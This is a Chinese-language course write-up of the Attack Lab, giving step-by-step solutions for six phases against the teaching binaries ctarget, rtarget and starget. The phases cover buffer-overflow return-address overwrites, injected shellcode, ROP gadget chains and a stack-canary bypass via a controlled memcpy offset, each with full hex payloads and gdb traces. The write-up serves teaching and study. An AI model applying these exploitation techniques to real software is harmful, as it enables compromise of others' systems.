# ICS - Attack Lab | 缓冲区溢出，你看你干的好事！

在 Attack Lab 中，我们要针对三个存在不同安全漏洞的程序，设计并实现总计六种攻击方案。三个程序有着不同的安全性，可能会有栈随机化保护和栈破坏检测，我们要实现的攻击类型有栈粉碎攻击，代码注入攻击和 ROP 攻击。

## 预备知识

### 汇编语言和 GDB 工具

在 Attack Lab 中，我们需要阅读和理解反汇编代码，有时需要使用 GDB 工具进行调试和分析程序行为。

### 栈粉碎攻击

栈粉碎攻击是一种常见的缓冲区溢出攻击形式，通过向程序输入超长数据，覆盖栈上的返回地址或其他关键数据，从而破坏程序正常控制流。

![](./.assets/stack-smashing-attack.png)

### 代码注入攻击

代码注入攻击指攻击者将恶意代码植入目标程序的内存中，并通过溢出等手段跳转至该代码执行。
![](./.assets/code-injection-attack.png)

### ROP 攻击

ROP（Return-Oriented Programming）攻击是一种高级代码复用技术，通过组合程序中已有的代码片段（称为 gadgets）来构建恶意功能链。
![](./.assets/rop-attack.png)

## 前置准备

### 了解 target

在开始攻击之前，我们需要了解目标程序的功能和漏洞。Attack Lab 提供了三个目标程序：`ctarget`、`rtarget` 和 `starget`。通过阅读文档，我们知道三者有着相似的读取输入的逻辑。

`ctarget` 和 `rtarget` 通过下面定义的 `getbuf` 函数从标准输入读取字符串：

```c
unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

`gets()` 函数无法判断其目标缓冲区是否足以存储将要读取的字符串。该函数会直接复制字节序列，这可能导致超出目标位置已分配存储空间的边界（即发生缓冲区溢出）。

`starget` 程序同样会从标准输入读取字符串。不过，它使用的是另一个函数 `getbuf_with_canary`（带金丝雀值的 `getbuf` 函数）来实现这一操作:

```c
unsigned getbuf_withcanary()
{
    int len;
    char buf[128];
    char logMsg[128];
    len = 0;
    Gets(buf);
    memcpy(logMsg + len, buf, sizeof(buf));
    return 1;
}
```

### 反汇编 target

在 Attack Lab 中，我们可以使用 `objdump` 工具对目标程序进行反汇编，以便查看其汇编代码和了解栈空间情况。

```bash
objdump -d ctarget > ctarget.s
objdump -d rtarget > rtarget.s
objdump -d starget > starget.s
```

### 生成指令序列的字节码

在 Attack Lab 中，要想实现代码注入，我们需要将汇编指令转换为对应的字节码。具体步骤如下：

1. 编写汇编代码并保存为 `example.s` 文件：

```asm
pushq   $0xabcdef  # Push value onto stack
addq    $17, %rax   # Add 17 to %rax
movl    %eax, %edx  # Copy lower 32 bits to %edx
```

2. 使用 `gcc` 工具将汇编代码编译为目标文件：

```bash
gcc -c example.s -o example.o
```

3. 使用 `objdump` 工具反汇编：

```bash
objdump -d example.o > example.d
```

4. 查看反汇编结果，获取对应的字节码：

```asm

example.o:     file format elf64-x86-64


Disassembly of section .text:

140000000000000000 <.text>:
   0: 68 ef cd ab 00    pushq   $0xabcdef
   5: 48 83 c0 11       add     $0x11, %rax
   9: 89 c2             mov     %eax, %edx
```

### hex2raw 工具

在 Attack Lab 中，由于 `target` 以字符串的形式读入，我们需要使用 `hex2raw` 工具将十六进制字符串转换为原始字节序列，以便构造攻击载荷。该工具的使用方法如下：

```bash
./hex2raw < phase.txt > phase.raw
```

然后，我们可以将生成的 `phase.raw` 文件作为输入传递给目标程序：

```bash
./ ctarget < phase.raw
./ ctarget -i phase.raw
```

或者使用流水线方式：

```bash
cat phase.txt | ./hex2raw | ./ctarget
```

## Phase 1

在 phase 1 中，我们需要针对 `ctarget` 程序实现栈粉碎攻击。

```c
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

```c
void touch1()
{
    vlevel = 1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

我们需要构造一个输入，使得 `getbuf` 函数返回后，程序的控制流跳转到 `touch1` 函数。为此，我们需要覆盖栈上的返回地址，使其指向 `touch1` 函数的地址。

我们先查看一下 `getbuf` 函数的汇编代码，了解一下函数的栈空间是如何分布的。

```asm
0000000000401ba7 <getbuf>:
  401ba7:	f3 0f 1e fa          	endbr64
  401bab:	48 83 ec 18          	sub    $0x18,%rsp
  401baf:	48 89 e7             	mov    %rsp,%rdi
  401bb2:	e8 57 03 00 00       	call   401f0e <Gets>
  401bb7:	b8 01 00 00 00       	mov    $0x1,%eax
  401bbc:	48 83 c4 18          	add    $0x18,%rsp
  401bc0:	c3                   	ret
```

从汇编代码中，我们可以看到 `getbuf` 函数在栈上分配了 0x18（24）字节的空间用于局部变量 `buf`。因此，我们需要输入超过 24 字节的数据来覆盖返回地址。从汇编代码中，我们还可以看到 `touch1` 函数的地址是 `0x401c33`。

于是，我们可以构造如下的输入：

```text
/* phase1.txt */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
33 1c 40 00 00 00 00 00 /* Address of touch1() */
```

转换为原始字节序列并传递给 `ctarget` 程序：

```bash
cat phase1.txt | ./hex2raw | ./ctarget
```

```text
Cookie: 0x24c8ce66
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

## Phase 2

在 phase 2 中，我们需要针对 `ctarget` 程序实现代码注入攻击。

```c
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

```c
void touch2(unsigned val)
{
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

我们需要构造一个输入，使得 `getbuf` 函数返回后，程序的控制流跳转到我们注入的代码，并调用 `touch2` 函数。为此，我们需要注入一段代码，该代码将 cookie 的值 `mov` 给 `%edi` 作为参数，并将 `touch2` 函数的地址 `pushq` 压入栈中，最后 `ret` 返回，这样程序就会跳转到 `touch2` 函数执行。

```asm
; phase 2 injected code
0000000000000000 <.text>:
   0:	bf 66 ce c8 24       	mov    $0x24c8ce66,%edi
   5:	68 67 1c 40 00       	push   $0x401c67
   a:	c3                   	ret
```

除此之外，我们还需要用注入代码的起始位置地址（即储存字符串的地址）覆盖 `getbuf` 函数的返回地址。

```asm
0000000000401ba7 <getbuf>:
  401ba7:	f3 0f 1e fa          	endbr64
  401bab:	48 83 ec 18          	sub    $0x18,%rsp
  401baf:	48 89 e7             	mov    %rsp,%rdi
  401bb2:	e8 57 03 00 00       	call   401f0e <Gets>
  401bb7:	b8 01 00 00 00       	mov    $0x1,%eax
  401bbc:	48 83 c4 18          	add    $0x18,%rsp
  401bc0:	c3                   	ret
```

```bash
gdb ctarget
b *(getbuf + 8)
layout asm
layout regs
r
p $rsp
```

通过调试，我们发现栈指针 `%rsp` 指向 `0x5566c3e8` 且正是字符串的储存地址（调试细节此处未呈现）。因此，我们可以构造如下的输入：

```text
/* phase2.txt */
bf 66 ce c8 24       	/* mov    $0x24c8ce66, %edi */
68 67 1c 40 00       	/* push   $0x401c67 */
c3                   	/* ret */
00 00 00 00 00 00 00 00
00 00 00 00 00
e8 c3 66 55 00 00 00 00 /* Address of injected code */
```

转换为原始字节序列并传递给 `ctarget` 程序：

```bash
cat phase2.txt | ./hex2raw | ./ctarget
```

```text
Cookie: 0x24c8ce66
Type string:Touch2!: You called touch2(0x24c8ce66)
Valid solution for level 2 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

## Phase 3

在 phase 3 中，我们需要针对 `ctarget` 程序实现代码注入攻击。

```c
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval)
{
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

我们需要构造一个输入，使得 `getbuf` 函数返回后，调用 `touch3` 函数。为此，我们需要注入一段代码，该代码将 cookie 的地址 `mov` 给 `%rdi` 作为参数，并将 `touch3` 函数的地址 `pushq` 压入栈中，最后 `ret` 返回，这样程序就会跳转到 `touch3` 函数执行。

与 phase 2 类似，我们需要用注入代码的起始位置地址（即储存字符串的地址）覆盖 `getbuf` 函数的返回地址。但除此之外，我们还需要将 cookie 储存在某个可控且安全的位置，并且将其地址 `mov` 给 `%rdi` 。

`getbuf` 函数在栈上分配的 0x18 字节的空间似乎足够存放我们注入的代码和 cookie，我们可以将 cookie 存放在栈上的局部变量 `buf` 中。但当调用 `hexmatch` 和 `strncmp` 这两个函数时，它们会将数据压入栈中，从而可能覆盖一部分原本存储着 `getbuf` 函数所用缓冲区的内存。

我们先尝试将 cookie 存放在 `buf` 中：

```text
/* phase3.txt */
48 c7 c7 f5 c3 66 55 	/* mov    $0x5566c3f5, %rdi */
68 8d 1d 40 00       	/* push   $0x401d8d */
c3                   	/* ret */
32 34 63 38 63 65 36 36 00 /* cookie string "24c8ce66" */
00 00
e8 c3 66 55 00 00 00 00 /* Address of injected code */
```

```bash
./hex2raw < phase3.txt > phase3.raw
```

启动调试，观察栈空间的变化：

```bash
gdb ctarget
b touch3
layout asm
layout regs
r < phase3.raw
```

在调用 `hexmatch` 函数前后，分别执行 `x/20x 0x5566c3e8` ，查看栈空间内容：

```text
(gdb) x/20x 0x5566c3e8
0x5566c3e8:	0x74747474	0x74747474	0x74747474	0x74747474
0x5566c3f8:	0x00000000	0x00000000	0x00000000	0x00000000
0x5566c408:	0x0041d668	0x00000000	0x0040010d	0x00000000
0x5566c418:	0x55855f50	0x00000000	0x004024fa	0x00000000
0x5566c428:	0x00000000	0x00000000	0xf4f4f4f4	0xf4f4f4f4
0x5566c438:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
(gdb) x/20x 0x5566c3e8
0x5566c3e8:	0x55855f58	0x00000000	0x0040458a	0x00000000
0x5566c3f8:	0x00401f0d	0x00000000	0x00400000	0x00000000
0x5566c408:	0x55855fad	0x00000000	0x004024fa	0x00000000
0x5566c418:	0x00000000	0x00000000	0xf4f4f4f4	0xf4f4f4f4
0x5566c428:	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4	0xf4f4f4f4
```

对比发现，在调用 `hexmatch` 函数后，栈空间的内容发生了变化，原本存储 cookie 的位置被覆盖了。因此，我们需要为 cookie 寻找一个更安全的位置，发现
`0x5566c414` 位置起的 12 个字节全为 0x00 ，且在调用 `hexmatch` 函数前后没有发生变化，我们可以将 cookie 存放在该位置。

同时为了防止会上层栈帧的覆盖造成不必要的影响，我们不改动除 cookie 之外的内容。

```text
/* phase3.txt */
48 c7 c7 14 c4 66 55 	/* mov    $0x5566c414, %rdi */
68 8d 1d 40 00       	/* push   $0x401d8d */
c3                   	/* ret */
00 00 00
00 00 00 00 00 00 00 00
e8 c3 66 55 00 00 00 00 /* Address of injected code */
00 5f 68 55 00 00 00 00
fa 24 40 00
32 34 63 38 63 65 36 36 00 /* cookie string "24c8ce66" */
```

转换为原始字节序列并传递给 `ctarget` 程序：

```bash
cat phase3.txt | ./hex2raw | ./ctarget
```

```text
Cookie: 0x24c8ce66
Type string:Touch3!: You called touch3("24c8ce66")
Valid solution for level 3 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

## Phase 4

在 phase 4 中，我们需要针对 `rtarget` 程序实现 ROP 攻击。

```c
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

```c
void touch2(unsigned val)
{
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

我们需要构造一个输入，使得 `getbuf` 函数返回后，程序的控制流跳转到 `touch2` 函数。但由于栈随机化，我们需要利用 ROP 技术，通过一系列的 gadgets 来实现对 `touch2` 函数的调用。

具体来说，我们需要找到合适的 gadgets 来构造 ROP 链，首先是将 cookie 的值加载到寄存器中，然后调用 `touch2` 函数。将值加载到寄存器中可以通过 `popq` 指令实现，这样我们只需要将 cookie 的值放到栈上即可。

清楚我们需要什么指令后，从 gadgets 库中寻找合适的 gadgets 组成 ROP 链：

```asm
; Gadget 1
401e9c: 58 c3 2c    popq %rax
                    ret
; Gadget 2
401e87: 89 c7 c3    movl %eax, %edi
                    ret
```

结合上述两个 gadgets，添加 `touch2` 函数地址和 cookie 的值组成攻击载荷：

```text
/* phase4.txt */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
9c 1e 40 00 00 00 00 00 /* Gadget 1 */
66 ce c8 24 00 00 00 00 /* cookie value */
87 1e 40 00 00 00 00 00 /* Gadget 2 */
f5 1b 40 00 00 00 00 00 /* Address of touch2 function */
```

转换为原始字节序列并传递给 `rtarget` 程序：

```bash
cat phase4.txt | ./hex2raw | ./rtarget
```

```text
Cookie: 0x24c8ce66
Type string:Touch2!: You called touch2(0x24c8ce66)
Valid solution for level 2 with target rtarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

## Phase 5

在 phase 4 中，我们需要针对 `rtarget` 程序实现 ROP 攻击。

```c
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval)
{
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

我们需要构造一个输入，使得 `getbuf` 函数返回后，调用 `touch3` 函数。但由于栈随机化，我们需要利用 ROP 技术，通过一系列的 gadgets 来实现对 `touch3` 函数的调用。

首先，需要将 cookie 字符串储存在内存空间中，由于 cookie 信息只能由我们的攻击载荷带入，所以 cookie 只能储存在栈空间中。但是，由于栈随机化保护，我们无法直接 cookie 字符串的确切地址。一个容易想到的方法是采用相对地址，虽然栈地址是随机的，但是 cookie 字符串相对于栈顶的偏移量是固定的，因此，我们可以通过获取当前 %rsp 的值再加上偏移量来获取 cookie 字符串的地址。

有了这个基本思路我们接下来就需要去寻找合适的 gadgets 来实现这个思路，这个过程比较曲折，因为提供的 gadgets 库中有时可能并没有直接对应的指令，我们需要通过组合多个 gadgets 来实现我们想要的功能。

```asm
; Gadget 1
401f2f: 48 89 e0 c3     movq %rsp, %rax
                        ret
; Gadget 2
401e90: 48 89 c7 90 c3  movq %rax, %rdi
                        nop
                        ret
; Gadget 3
401ea6: 58 c3           popq %rax
                        ret
; Gadget 4
401f83: 89 c1 38 c9 c3  movl %eax, %ecx
                        cmpb %cl, %cl
                        ret
; Gadget 5
401f8e: 89 ca 90 90 c3  movl %ecx, %edx
                        nop
                        nop
                        ret
; Gadget 6
401ef9: 89 d6 20 db c3  movl %edx, %esi
                        andb %bl, %bl
                        ret
; Gadget 7
401ecf: 48 8d 04 37 c3  lea (%rdi,%rsi,1), %rax
                        ret
; Gadget 8
401e90: 48 89 c7 90 c3  movq %rax, %rdi
                        nop
                        ret
```

结合上述 gadgets，添加 `touch3` 函数地址和 cookie 字符串组成攻击载荷：

```text
/* phase5.txt */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
2f 1f 40 00 00 00 00 00 /* Gadget 1 */
90 1e 40 00 00 00 00 00 /* Gadget 2 */
a6 1e 40 00 00 00 00 00 /* Gadget 3 */
48 00 00 00 00 00 00 00 /* Bias value 72 */
83 1f 40 00 00 00 00 00 /* Gadget 4 */
8e 1f 40 00 00 00 00 00 /* Gadget 5 */
f9 1e 40 00 00 00 00 00 /* Gadget 6 */
cf 1e 40 00 00 00 00 00 /* Gadget 7 */
90 1e 40 00 00 00 00 00 /* Gadget 8 */
1b 1d 40 00 00 00 00 00 /* Address of touch3 function */
32 34 63 38 63 65 36 36 00 /* cookie string "24c8ce66" */
```

转换为原始字节序列并传递给 `rtarget` 程序：

```bash
cat phase5.txt | ./hex2raw | ./rtarget
```

```text
Cookie: 0x24c8ce66
Type string:Touch3!: You called touch3("24c8ce66")
Valid solution for level 3 with target rtarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

## Phase 6

在 phase 6 中，我们需要针对 `starget` 程序实现 ROP 攻击。但是有了栈溢出检测的保护，简单的栈溢出无法实现返回导向编程（ROP）攻击，并且 `starget` 中的 `getbuf_withcanary` 函数也不再像 `getbuf` 那样存在漏洞。

```c
unsigned getbuf_withcanary()
{
    int len;
    char buf[128];
    char logMsg[128];
    len = 0;
    Gets(buf);
    memcpy(logMsg + len, buf, sizeof(buf));
    return 1;
}
```

```asm
0000000000401df6 <getbuf_withcanary>:
  401df6:	55                   	push   %rbp
  401df7:	48 89 e5             	mov    %rsp,%rbp
  401dfa:	48 81 ec 20 01 00 00 	sub    $0x120,%rsp
  401e01:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401e08:	00 00
  401e0a:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  401e0e:	31 c0                	xor    %eax,%eax
  401e10:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
  401e17:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
  401e1e:	48 89 c7             	mov    %rax,%rdi
  401e21:	e8 c3 02 00 00       	call   4020e9 <Gets>
  401e26:	8b 45 e4             	mov    -0x1c(%rbp),%eax
  401e29:	48 98                	cltq
  401e2b:	48 8d 95 e0 fe ff ff 	lea    -0x120(%rbp),%rdx
  401e32:	48 8d 0c 02          	lea    (%rdx,%rax,1),%rcx
  401e36:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
  401e3d:	ba 80 00 00 00       	mov    $0x80,%edx
  401e42:	48 89 c6             	mov    %rax,%rsi
  401e45:	48 89 cf             	mov    %rcx,%rdi
  401e48:	e8 f3 f2 ff ff       	call   401140 <memcpy@plt>
  401e4d:	b8 01 00 00 00       	mov    $0x1,%eax
  401e52:	48 8b 75 f8          	mov    -0x8(%rbp),%rsi
  401e56:	64 48 33 34 25 28 00 	xor    %fs:0x28,%rsi
  401e5d:	00 00
  401e5f:	74 05                	je     401e66 <getbuf_withcanary+0x70>
  401e61:	e8 72 07 00 00       	call   4025d8 <__stack_chk_fail>
  401e66:	c9                   	leave
  401e67:	c3                   	ret
```

我们需要构造一个输入，使得 `getbuf_withcanary` 函数返回后，调用 `touch3` 函数。但由于栈随机化，我们需要利用 ROP 技术，通过一系列的 gadgets 来实现对 `touch3` 函数的调用。

可以看到，`getbuf_withcanary` 函数中有两个缓冲区 `buf` 和 `logMsg`，并且 `memcpy` 函数会将 `buf` 中一定长度的内容复制到 `logMsg` 中。由于栈溢出保护，我们无法直接通过 `buf` 覆盖返回地址，那样会修改金丝雀值，那有没有可以绕过金丝雀值，直接覆写返回地址的方法呢？有的，兄弟，有的。我们可以利用 `memcpy` 函数配合 `len` 作为偏移量越过金丝雀值来实现 ROP 攻击。

首先，我们需要知道 `getbuf_withcanary` 函数的栈空间结构，通过阅读汇编代码或调试可以得到如下栈布局：

```text
单位：字节
+-------------------+
|   return addr[8]  |
+-------------------+
|      %rbp[8]      |
+-------------------+
|     canary[8]     |
+-------------------+
|       [16]        |
+-------------------+
|  len[4]  |        |
+-------------------+
|     buf[128]      |
+-------------------+
|    logMsg[128]    |
+-------------------+
```

我们发现 `len` 变量位于 `buf` 之后，因此我们可以通过 `buf` 来覆写 `len` 的值，从而控制 `memcpy` 函数的复制字符串的目的地址，进而实现 ROP 攻击。需要注意，`memcpy` 函数只复制 128 字节，这意味着我们的 ROP 链不能过长。

接下来，我们只需要计算好偏移量，然后照搬 phase 5 的 ROP 链即可。注意 phase 6 中的 `touch3` 和对应 `gadget` 地址与 phase 5 不同。

```text
/* phase6.txt */
eb 1e 40 00 00 00 00 00 /* Gadget 1 */
83 1e 40 00 00 00 00 00 /* Gadget 2 */
a3 1e 40 00 00 00 00 00 /* Gadget 3 */
48 00 00 00 00 00 00 00 /* Bias value 72 */
8a 1f 40 00 00 00 00 00 /* Gadget 4 */
95 1f 40 00 00 00 00 00 /* Gadget 5 */
00 1f 40 00 00 00 00 00 /* Gadget 6 */
d6 1e 40 00 00 00 00 00 /* Gadget 7 */
83 1e 40 00 00 00 00 00 /* Gadget 8 */
22 1d 40 00 00 00 00 00 /* Address of touch3 function */
32 34 63 38 63 65 36 36 /* cookie string "24c8ce66" */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00
28 01 00 00 /* len value 296 */
```

转换为原始字节序列并传递给 `starget` 程序：

```bash
cat phase6.txt | ./hex2raw | ./starget
```

```text
Cookie: 0x24c8ce66
Type string:Touch3!: You called touch3("24c8ce66")
Valid solution for level 3 with target starget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

---

[更适合北大宝宝体质的 Attack Lab 踩坑记](https://arthals.ink/blog/attack-lab)

[读厚 CSAPP III Attack Lab](https://www.wdxtub.com/blog/csapp/thick-csapp-lab-3)
